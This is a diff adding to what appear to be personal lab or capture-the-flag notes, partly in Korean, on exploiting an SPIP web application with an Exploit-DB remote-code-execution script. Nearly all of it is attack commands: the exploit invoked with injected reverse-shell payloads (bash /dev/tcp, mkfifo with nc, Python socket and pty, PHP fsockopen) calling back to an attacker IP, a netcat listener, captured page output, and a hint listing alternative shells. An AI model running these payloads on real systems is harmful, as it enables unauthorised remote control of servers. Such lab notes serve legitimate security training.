@@ -398,3 +398,35 @@ python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.1
 - bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
 - rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f
 - nc -lvnp 1234
+
+┌──(root㉿docker-desktop)-[/]
+└─# python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "rm -f /tmp/f; mkfifo /tmp/f; cat /tmp/f | sh -i 2>&1 | nc 10.8.136.212 1234 >/tmp/f" --verbose | grep input
+<span class="form-hidden"><input name="page" value="spip_pass" type="hidden"
+/><input name='formulaire_action' type='hidden'
+                value='oubli' /><input name='formulaire_action_args' type='hidden'
+                value='AKXEs4U6r36PZ5LnRZXtHvxQ/ZZYCXnJB2crlmVwgtlVVXwXn/MCLPMydXPZCL/WsMlnvbq2xARLr6toNbdfE/YV7egygXhx' /><input name='formulaire_action_sign' type='hidden'
+
+<input type="email" class="text email" autofocus="autofocus" required="required" name='oubli' id='oubli' value="s:103:"";" 아무것도 오지 않음 autocapitalize="off" autocorrect="off" />
+<input type="text" class="text" name="nobot" id="nobot" value="" size="10" />
+
+<p class="boutons"><input type="submit" class="btn submit" value="OK" /></p>
+
+> hint 🔄 다른 역쉘 페이로드 시도 (Alternative Payloads)Netcat(nc) 명령이 대상 서버의 환경(버전, 설치 여부)에 따라 작동하지 않을 수 있습니다.문제점: 대상 서버에 $\text{Netcat}$ 대신 $\text{Bash}$, $\text{Python}$, 또는 $\text{PHP}$만 설치되어 있을 수 있습니다.해결책: 파이썬 스크립트의 -c 플래그에 다른 형태의 역쉘 명령어를 넣어 시도해 보세요
+
+# 환경에 따라 bash, nc, python, php 설치 여부가 다르므로 항상 된다는 보장이 없음 -> 다양한 RS 준비
+
+```sh
+Python,"python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'"
+Bash,bash -i >& /dev/tcp/10.8.136.212/1234 0>&1
+PHP,"php -r '$sock=fsockopen(""10.8.136.212"",1234);exec(""/bin/sh -i <&3 >&3 2>&3"");'"
+```
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "python3 -c 'import socket,os,pty;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((""10.8.136.212"",1234));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);pty.spawn(""/bin/bash"")'" --verbose
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "bash -i >& /dev/tcp/10.8.136.212/1234 0>&1" --verbose
+
+# 작은따옴표로 문자열을 감싸서 명령 주입 오류를 피합니다.
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "php -r '$sock=fsockopen(\"10.8.136.212\",1234);exec(\"/bin/sh -i <&3 >&3 2>&3\");'" --verbose
+
+python3 /usr/share/exploitdb/exploits/php/webapps/51536.py -u http://10.201.43.138/spip/spip.php -c "ping -c 1 10.8.136.212" --verbose
